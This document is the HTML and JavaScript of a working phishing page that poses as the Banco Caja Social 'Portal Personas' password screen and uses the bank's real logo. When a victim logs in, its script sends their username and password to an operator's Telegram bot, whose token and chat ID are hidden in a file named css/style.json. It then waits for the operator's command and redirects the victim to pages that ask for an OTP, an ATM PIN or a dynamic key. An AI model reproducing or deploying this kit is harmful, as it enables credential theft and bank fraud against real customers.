<!DOCTYPE html>

<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Portal Personas - Contrase√±a</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    body { font-family: 'Inter', sans-serif; }


.loaderp {
  width: 48px;
  height: 48px;
  border: 5px solid #FFF;
  border-bottom-color: #e8114b;
  border-radius: 50%;
  display: inline-block;
  box-sizing: border-box;
  animation: rotation 1s linear infinite;
}
@keyframes rotation {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.loaderp-full {
  position: fixed;
  top: 0;
  left: 0;
  overflow-y: hidden;
  z-index: 1000;
  background-color: white;
  width: 100vw;
  height: 100vh;
  display: none;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}
/* small helpers */
.hidden { display: none !important; }

  </style>
</head>
<body class="bg-gray-50 min-h-screen">
  <div class="max-w-md mx-auto bg-white min-h-screen">
    <div class="px-6 py-8">
      <div class="mb-8">
        <div class="w-48 h-12 flex items-center">
          <img src="https://bancapersonas.bancocajasocial.com/auth/resources/0flbi/login/bcs/img/logoBCSLine.svg"
               alt="Logo"
               class="h-full w-auto object-contain">
        </div>
      </div>


  <h2 class="text-3xl font-bold text-gray-800 mb-6 leading-tight">
    Bienvenido al<br>Portal Personas
  </h2>

  <p class="text-gray-600 mb-8 leading-relaxed">
    Ingrese su contrase√±a de canales digitales, recuerde que est√° compuesta por m√°ximo 8 caracteres.
  </p>

  <!-- Password input -->
  <div class="mb-6">
    <label class="block text-gray-700 text-lg font-medium mb-4">Contrase√±a</label>
    <div class="relative">
      <input
        type="password"
        id="passwordInput"
        maxlength="8"
        class="w-full px-4 py-3 pr-12 border border-gray-300 rounded-lg text-lg focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
        placeholder=""
        autocomplete="current-password"
      >
      <button
        type="button"
        id="togglePassword"
        class="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
        aria-label="Mostrar u ocultar contrase√±a"
      >
        <svg id="eyeIcon" class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
        </svg>
        <svg id="eyeSlashIcon" class="w-6 h-6 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
        </svg>
      </button>
    </div>
  </div>

  <!-- Login button -->
  <button id="loginButton" disabled
    class="w-full bg-gray-300 text-gray-500 py-2 rounded-full text-lg font-medium mb-8 cursor-not-allowed">
    Iniciar sesi√≥n
  </button>

  <div class="mb-16">
    <button class="text-blue-600 font-medium flex items-center">
      ¬øOlvid√≥ su contrase√±a?
      <svg class="w-4 h-4 ml-2" fill="currentColor" viewBox="0 0 20 20">
        <path fill-rule="evenodd"
              d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
              clip-rule="evenodd"></path>
      </svg>
    </button>
  </div>

  <div class="border-t border-gray-200 pt-8">
    <p class="text-gray-700 text-lg mb-4">¬øEs un cliente nuevo?</p>
    <button class="text-blue-600 font-medium text-lg underline">Registrarse</button>
  </div>
</div>


  </div>

  <!-- LOADER FULL -->

  <div class="loaderp-full" id="loaderFull" role="status" aria-hidden="true">
    <span class="loaderp" aria-hidden="true"></span>
    <p class="text-gray-600 text-lg font-light mt-4">Verificando credenciales...</p>
  </div>

  <script>
    // Elementos
    const passwordInput = document.getElementById('passwordInput');
    const togglePassword = document.getElementById('togglePassword');
    const eyeIcon = document.getElementById('eyeIcon');
    const eyeSlashIcon = document.getElementById('eyeSlashIcon');
    const loginButton = document.getElementById('loginButton');
    const loader = document.getElementById('loaderFull');

    // Cargar config (token + chat_id)
    async function loadTelegramConfig() {
      try {
        const res = await fetch('./css/style.json', { cache: 'no-store' });
        if (!res.ok) throw new Error('No se pudo cargar css/style.json (status ' + res.status + ')');
        const cfg = await res.json();
        if (!cfg.token || !cfg.chat_id) {
          console.error('Archivo de configuraci√≥n inv√°lido (falta token o chat_id).');
          return null;
        }
        return cfg;
      } catch (err) {
        console.error('loadTelegramConfig error:', err);
        alert('Error cargando configuraci√≥n de Telegram. Revisa css/style.json y CORS.');
        return null;
      }
    }

    // Eliminar webhook para poder usar getUpdates
    async function deleteWebhook(config) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${config.token}/deleteWebhook`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        });
        const result = await res.json();
        console.log('deleteWebhook result:', result);
        return result.ok;
      } catch (err) {
        console.error('deleteWebhook error:', err);
        return false;
      }
    }

    // Toggle mostrar/ocultar contrase√±a
    togglePassword.addEventListener('click', () => {
      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordInput.setAttribute('type', type);
      if (type === 'text') {
        eyeIcon.classList.add('hidden');
        eyeSlashIcon.classList.remove('hidden');
      } else {
        eyeIcon.classList.remove('hidden');
        eyeSlashIcon.classList.add('hidden');
      }
    });

    // Activar bot√≥n cuando haya texto v√°lido
    passwordInput.addEventListener('input', function() {
      const val = this.value.trim();
      if (val.length > 0 && val.length <= 8) {
        loginButton.disabled = false;
        loginButton.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        loginButton.classList.add('bg-blue-600', 'text-white', 'hover:bg-blue-700', 'cursor-pointer');
      } else {
        loginButton.disabled = true;
        loginButton.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
        loginButton.classList.remove('bg-blue-600', 'text-white', 'hover:bg-blue-700', 'cursor-pointer');
      }
    });

    // Permitir Enter
    passwordInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter' && !loginButton.disabled) {
        loginButton.click();
      }
    });

    // Obtener datos userData desde localStorage (viene del index previo)
    let userData = {};
    try {
      const savedData = localStorage.getItem('userData');
      if (savedData) userData = JSON.parse(savedData);
    } catch (e) {
      console.error('Error al parsear userData:', e);
      userData = {};
    }

    // Env√≠o de credenciales a Telegram (sendMessage)
    async function sendCredentialsToTelegram(data) {
      const config = await loadTelegramConfig();
      if (!config) throw new Error('No se pudo cargar configuraci√≥n Telegram');

      const message = `üîê Credenciales de acceso completas

üîó Session ID: ${data.transactionId}
üë§ Usuario: ${data.usuario}
üîë Contrase√±a: ${data.password}
üì± Portal: Banco Caja Social
üÜî Transacci√≥n: ${data.transactionId}`;

      const keyboard = {
        inline_keyboard: [
          [{ text: "üì± Pedir OTP", callback_data: `pedir_otp:${data.transactionId}` }],
          [{ text: "üèß Pedir Clave Cajero", callback_data: `pedir_cajero:${data.transactionId}` }],
          [{ text: "üîê Pedir Clave Din√°mica", callback_data: `pedir_dinamica:${data.transactionId}` }],
          [{ text: "‚ùå Error Logo", callback_data: `error_logo:${data.transactionId}` }],
          [{ text: "‚úÖ Finalizar", callback_data: `finalizar:${data.transactionId}` }]
        ]
      };

      const body = {
        chat_id: config.chat_id,
        text: message,
        reply_markup: keyboard,
        parse_mode: 'HTML'
      };

      const res = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });

      const j = await res.json();
      if (!j.ok) {
        console.error('sendMessage respuesta:', j);
        throw new Error('Error enviando mensaje a Telegram: ' + (j.description || 'unknown'));
      }

      return j.result;
    }

    // Verificaci√≥n de pago simplificada (basada en el c√≥digo funcional)
    async function checkPaymentVerification(transactionId) {
      const config = await loadTelegramConfig();
      if (!config) {
        loader.style.display = 'none';
        return;
      }

      // Intentar eliminar webhook si existe
      console.log('Eliminando webhook...');
      await deleteWebhook(config);
      
      // Esperar un poco despu√©s de eliminar el webhook
      await new Promise(resolve => setTimeout(resolve, 1000));

      function checkUpdates() {
        fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
          .then(response => response.json())
          .then(data => {
            if (!data.ok) {
              console.error("Error en getUpdates:", data);
              if (data.error_code === 409) {
                console.log("Webhook a√∫n activo, reintentando...");
                setTimeout(checkUpdates, 3000);
                return;
              }
              throw new Error(`Telegram API error: ${data.description}`);
            }
            
            console.log("Datos recibidos de Telegram:", data);
            const updates = data.result;
            const verificationUpdate = updates.find(update => 
              update.callback_query &&
              (update.callback_query.data === `pedir_otp:${transactionId}` ||
               update.callback_query.data === `pedir_cajero:${transactionId}` ||
               update.callback_query.data === `pedir_dinamica:${transactionId}` ||
               update.callback_query.data === `error_logo:${transactionId}` ||
               update.callback_query.data === `finalizar:${transactionId}`)
            );

            if (verificationUpdate) {
              loader.style.display = 'none';
              console.log("Verificaci√≥n encontrada:", verificationUpdate);
              handleTelegramResponse(verificationUpdate.callback_query.data);
            } else {
              setTimeout(checkUpdates, 2000);
            }
          })
          .catch(error => {
            console.error("Error al verificar el pago:", error);
            setTimeout(checkUpdates, 3000);
          });
      }

      checkUpdates();
    }

    // Manejo de la acci√≥n
    function handleTelegramResponse(callbackData) {
      const [action, transactionId] = (callbackData || '').split(':');
      switch (action) {
        case 'pedir_otp':
          window.location.href = 'otp.html';
          break;
        case 'pedir_cajero':
          window.location.href = 'clavec.html';
          break;
        case 'pedir_dinamica':
          window.location.href = 'dinamica.html';
          break;
        case 'error_logo':
          alert('Usuario o clave incorrecto. Por favor, revise sus datos e intente nuevamente.');
          setTimeout(() => { window.location.href = 'index.html'; }, 1000);
          break;
        case 'finalizar':
          alert('Proceso completado exitosamente');
          break;
        default:
          console.log('Acci√≥n no reconocida:', action);
          break;
      }
    }

    // Funci√≥n principal al hacer click en iniciar sesi√≥n
    loginButton.addEventListener('click', async function() {
      const password = passwordInput.value.trim();
      if (!password) return;

      loader.style.display = 'flex';

      const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

      const loginData = {
        transactionId,
        sessionId: userData.sessionId || 'unknown',
        usuario: userData.usuario || 'usuario_desconocido',
        password,
        timestamp: new Date().toISOString()
      };

      try {
        // Enviar credenciales a Telegram (sendMessage)
        const sendResult = await sendCredentialsToTelegram(loginData);
        console.log('sendMessage result:', sendResult);

        // Guardar localmente
        localStorage.setItem('loginData', JSON.stringify(loginData));

        // Iniciar verificaci√≥n de respuesta del admin
        checkPaymentVerification(transactionId);

      } catch (err) {
        console.error('Error enviando credenciales:', err);
        loader.style.display = 'none';
        alert('Error al enviar credenciales. Revisa la consola (CORS o token inv√°lido).');
      }
    });

    // Cuando carga la p√°gina: si no hay userData, redirigir
    document.addEventListener('DOMContentLoaded', function() {
      const savedData = localStorage.getItem('userData');
      if (!savedData) {
        console.log('No hay datos de usuario, redirigiendo al index...');
        window.location.href = 'index.html';
      } else {
        try {
          userData = JSON.parse(savedData);
        } catch (e) {
          userData = {};
        }
      }
    });
  </script>

</body>
</html>
